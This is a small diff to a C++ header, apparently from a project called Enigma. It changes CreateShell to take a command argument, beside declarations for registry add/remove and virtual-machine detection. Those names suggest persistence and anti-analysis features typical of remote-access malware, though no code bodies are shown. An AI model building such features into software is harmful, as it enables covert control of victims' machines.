@@ -10,7 +10,7 @@ namespace Sys {
 int AddToRegistry();
 int RemoveFromRegistry();
 bool CheckForVirtualMachine();
-int CreateShell();
+int CreateShell(LPSTR command);
 }
 
 #endif //ENIGMA_SRC_SYS_H_
